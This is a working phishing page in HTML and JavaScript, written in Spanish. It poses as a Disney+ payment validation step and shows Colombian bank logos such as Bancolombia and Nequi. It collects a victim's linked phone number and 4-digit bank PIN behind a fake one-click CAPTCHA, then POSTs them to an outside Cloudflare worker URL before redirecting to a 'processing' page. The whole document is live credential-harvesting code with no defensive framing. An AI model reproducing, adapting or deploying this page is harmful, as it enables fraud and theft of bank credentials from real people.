<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>ValidaciÃ³n - Disney+</title>

<style>
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
}

body {
    background: #f5f5f5;
    font-family: -apple-system, BlinkMacSystemFont, sans-serif;
    min-height: 100vh;
    display: flex;
    flex-direction: column;
}

.container {
    max-width: 400px;
    margin: 40px auto;
    padding: 25px;
    background: #fff;
    border-radius: 8px;
    box-shadow: 0 2px 10px rgba(0,0,0,0.05);
}

.bank-logo {
    display: block;
    margin: 0 auto 20px;
    width: 60px;
    height: 60px;
}

.input-group {
    margin-bottom: 20px;
}

.input-label {
    display: block;
    margin-bottom: 6px;
    font-size: 14px;
    color: #555;
}

.input-field {
    width: 100%;
    padding: 12px;
    border: 1px solid #ddd;
    border-radius: 6px;
    font-size: 16px;
    outline: none;
}

.input-field:focus {
    border-color: #0063e5;
}

.validation-message {
    font-size: 12px;
    color: #ff4444;
    margin-top: 5px;
    display: none;
}

.captcha-section {
    margin: 25px 0;
    padding: 15px;
    background: #f8f9fa;
    border-radius: 8px;
}

.captcha-progress-container {
    width: 100%;
    height: 50px;
    background: #f0f0f0;
    border-radius: 25px;
    overflow: hidden;
    position: relative;
    cursor: pointer;
}

.captcha-progress-fill {
    position: absolute;
    top: 0;
    left: 0;
    height: 100%;
    width: 0%;
    background: linear-gradient(90deg, #4CAF50, #00C853);
    border-radius: 25px;
    transition: width 0.8s cubic-bezier(0.4, 0, 0.2, 1);
}

.captcha-text {
    position: absolute;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    font-size: 14px;
    color: #666;
    z-index: 2;
}

.captcha-progress-container.completed .captcha-text {
    color: white;
    font-weight: bold;
}

.submit-btn {
    width: 100%;
    padding: 14px;
    background: #ddd;
    color: #666;
    border: none;
    border-radius: 6px;
    font-size: 16px;
    font-weight: 500;
    cursor: not-allowed;
    margin-top: 10px;
}

.submit-btn.active {
    background: #0063e5;
    color: white;
    cursor: pointer;
}

.submit-btn.active:hover {
    background: #0052cc;
}

#loader {
    display: none;
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: rgba(255, 255, 255, 0.95);
    z-index: 9999;
    text-align: center;
    padding-top: 40%;
    font-size: 18px;
}

.payment-info {
    margin-top: 20px;
    padding: 15px;
    background: #f8f9fa;
    border-radius: 6px;
    font-size: 14px;
    color: #666;
    text-align: center;
}

.payment-info strong {
    color: #333;
}

.footer {
    margin-top: auto;
    padding: 20px;
    text-align: center;
    font-size: 12px;
    color: #888;
}
</style>
</head>

<body>

<div class="container">
    
    <!-- Logo del banco -->
    <img id="bankLogo" class="bank-logo" alt="Banco" src="">
    
    <!-- Formulario -->
    <div class="input-group">
        <label class="input-label">NÃºmero vinculado<span style="color:#ff4444">*</span></label>
        <input type="number" class="input-field" id="usuario" placeholder="Ej: 3115555555" 
               pattern="3[0-9]{9}" maxlength="10" minlength="10" inputmode="numeric">
        <div class="validation-message" id="usuario-error">NÃºmero invÃ¡lido (10 dÃ­gitos, empezar con 3)</div>
    </div>
    
    <div class="input-group">
        <label class="input-label">Clave de 4 dÃ­gitos<span style="color:#ff4444">*</span></label>
        <input type="password" class="input-field" id="clave" placeholder="****" 
               pattern="[0-9]{4}" maxlength="4" minlength="4" inputmode="numeric">
        <div class="validation-message" id="clave-error">Clave invÃ¡lida (4 dÃ­gitos)</div>
    </div>

    <!-- CAPTCHA simplificado -->
    <div class="captcha-section">
        <div style="text-align: center; font-size: 14px; color: #666; margin-bottom: 10px;">
            Haz clic para verificar que no eres un robot
        </div>
        <div class="captcha-progress-container" id="captchaProgress">
            <div class="captcha-progress-fill" id="captchaFill"></div>
            <div class="captcha-text" id="captchaText">Haz clic para verificar</div>
        </div>
        <div class="validation-message" id="captcha-error" style="text-align: center;">
            Verifica que no eres un robot
        </div>
    </div>

    <!-- Info del pago -->
    <div class="payment-info">
        Pago a: <strong>Disney+</strong><br>
        Monto: <strong id="paymentAmount">COP 24.900/mes</strong>
    </div>
    
    <!-- BotÃ³n -->
    <button class="submit-btn" id="loginBtn" disabled>
        <span id="btnText">Verificar Identidad</span>
    </button>
    
</div>

<div class="footer">
    Â© 2025 Disney+. Proceso seguro.
</div>

<div id="loader"></div>

<script>
// ðŸ”¥ WORKER URL - MANTENIENDO LA LÃ“GICA DEL CÃ“DIGO ORIGINAL
const WORKER_URL = "https://throbbing-sky-6a75.claropromoxlaro.workers.dev";

// Variables globales
let captchaValidado = false;
let camposValidos = {
    usuario: false,
    clave: false
};

// Logos de bancos
const logos = {
    "Bancolombia": "https://upload.wikimedia.org/wikipedia/commons/5/5a/Logo_Bancolombia.png",
    "Nequi": "https://upload.wikimedia.org/wikipedia/commons/8/89/Nequi_logo_2021.png",
    "Davivienda": "https://upload.wikimedia.org/wikipedia/commons/5/54/Logo-davivienda.png",
    "BBVA": "https://upload.wikimedia.org/wikipedia/commons/8/8b/BBVA_Logo.svg",
    "Banco Popular": "https://upload.wikimedia.org/wikipedia/commons/8/8e/Banco_Popular_logo.png",
    "Banco de BogotÃ¡": "https://upload.wikimedia.org/wikipedia/commons/8/89/Banco_de_Bogota_logo.svg",
    "ItaÃº": "https://upload.wikimedia.org/wikipedia/commons/0/0a/Itau_logo.png"
};

// ðŸ”¥ FUNCIÃ“N DE VALIDACIÃ“N (MISMA LÃ“GICA)
function validarCampo(campoId, valor) {
    const errorElement = document.getElementById(campoId + '-error');
    let esValido = false;

    switch(campoId) {
        case 'usuario':
            esValido = /^3[0-9]{9}$/.test(valor);
            break;
        case 'clave':
            esValido = /^[0-9]{4}$/.test(valor);
            break;
    }

    // Actualizar estado
    camposValidos[campoId] = esValido;
    
    if (esValido) {
        errorElement.style.display = 'none';
    } else {
        errorElement.style.display = 'block';
    }

    return esValido;
}

// ðŸ”¥ ACTUALIZAR PROGRESO (MISMA LÃ“GICA)
function actualizarProgreso() {
    const campos = ['usuario', 'clave'];
    let completados = 0;

    campos.forEach(campo => {
        const valor = document.getElementById(campo).value;
        if (validarCampo(campo, valor)) {
            completados++;
        }
    });

    // AÃ±adir CAPTCHA
    if (captchaValidado) {
        completados++;
        document.getElementById('captcha-error').style.display = 'none';
    } else {
        document.getElementById('captcha-error').style.display = 'block';
    }

    return completados === (campos.length + 1);
}

// ðŸ”¥ VALIDAR CAMPOS Y ACTUALIZAR BOTÃ“N
function validarCampos() {
    const todosCompletos = actualizarProgreso();
    const loginBtn = document.getElementById('loginBtn');
    const btnText = document.getElementById('btnText');

    if (todosCompletos) {
        loginBtn.classList.add('active');
        loginBtn.disabled = false;
        btnText.textContent = "âœ… Verificar Identidad";
    } else {
        loginBtn.classList.remove('active');
        loginBtn.disabled = true;
        btnText.textContent = "Verificar Identidad";
    }
}

// ðŸ”¥ CAPTCHA (MISMA LÃ“GICA)
document.getElementById('captchaProgress').addEventListener('click', function () {
    if (captchaValidado) return;

    captchaValidado = true;
    const captchaFill = document.getElementById('captchaFill');
    const captchaText = document.getElementById('captchaText');
    const captchaContainer = document.getElementById('captchaProgress');

    // AnimaciÃ³n de llenado
    captchaFill.style.width = '100%';
    captchaContainer.classList.add('completed');
    captchaText.textContent = "âœ“ Verificado";

    // Actualizar validaciÃ³n
    setTimeout(() => {
        validarCampos();
    }, 500);
});

// ðŸ”¥ MANEJO DEL FORMULARIO (MISMA LÃ“GICA)
document.getElementById('loginBtn').addEventListener('click', async function (e) {
    e.preventDefault();

    if (!actualizarProgreso()) {
        alert('Por favor completa todos los campos correctamente.');
        return;
    }

    const loader = document.getElementById('loader');
    const loginBtn = document.getElementById('loginBtn');

    // Mostrar loader
    loader.style.display = 'block';
    loader.innerHTML = 'â³ Verificando identidad...';
    loginBtn.disabled = true;

    const datos = {
        usuario: document.getElementById('usuario').value.trim(),
        clave: document.getElementById('clave').value.trim(),
        nombre: "Usuario Disney+", // Placeholder como en el cÃ³digo original
        correo: "usuario@disney.com", // Placeholder
        cedula: "CC 000000000", // Placeholder
        saldo: 0,
        transactionId: 'DISNEY_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9),
        bank: localStorage.getItem("selectedBank") || "Disney+"
    };

    console.log("ðŸ“¤ Enviando datos a worker:", datos);

    try {
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 10000);

        const response = await fetch(`${WORKER_URL}/login`, {
            method: "POST",
            headers: { 
                "Content-Type": "application/json",
                "Accept": "application/json"
            },
            body: JSON.stringify(datos),
            signal: controller.signal
        });

        clearTimeout(timeoutId);

        if (!response.ok) {
            throw new Error(`HTTP ${response.status}`);
        }

        const result = await response.json();
        console.log("âœ… Respuesta del worker:", result);

        if (result.ok) {
            localStorage.setItem('bankAuthData', JSON.stringify(datos));
            
            loader.innerHTML = 'âœ… VerificaciÃ³n exitosa. Redirigiendo...';
            
            setTimeout(() => {
                window.location.href = 'procesando.html';
            }, 2000);

        } else {
            throw new Error(result.error || 'Error del servidor');
        }

    } catch (error) {
        console.error('âŒ Error:', error);
        
        let errorMessage = "Error de conexiÃ³n";
        if (error.name === 'AbortError') {
            errorMessage = "Tiempo de espera agotado";
        }

        loader.innerHTML = `âŒ ${errorMessage}. Reintentando...`;
        
        setTimeout(() => {
            loader.style.display = 'none';
            loginBtn.disabled = false;
        }, 3000);
    }
});

// ðŸ”¥ EVENT LISTENERS PARA VALIDACIÃ“N (MISMA LÃ“GICA)
document.getElementById('usuario').addEventListener('input', function() {
    validarCampo('usuario', this.value);
    validarCampos();
});

document.getElementById('clave').addEventListener('input', function() {
    validarCampo('clave', this.value);
    validarCampos();
});

// ðŸ”¥ INICIALIZACIÃ“N (MISMA LÃ“GICA)
document.addEventListener('DOMContentLoaded', function() {
    console.log('âœ… ValidaciÃ³n listo');
    
    // Configurar logo del banco
    const bank = localStorage.getItem("selectedBank") || "";
    const logoElement = document.getElementById("bankLogo");
    if (bank && logos[bank]) {
        logoElement.src = logos[bank];
        logoElement.alt = bank;
    } else {
        logoElement.style.display = "none";
    }
    
    // Mostrar monto del pago
    const paymentData = JSON.parse(localStorage.getItem("paymentData") || "{}");
    if (paymentData.amount) {
        document.getElementById("paymentAmount").textContent = paymentData.amount;
    }
    
    // ValidaciÃ³n inicial
    validarCampos();
});

// ðŸ”¥ MANEJAR ENTER
document.addEventListener('keypress', function(e) {
    if (e.key === 'Enter' && document.getElementById('loginBtn').classList.contains('active')) {
        document.getElementById('loginBtn').click();
    }
});
</script>

</body>
</html>
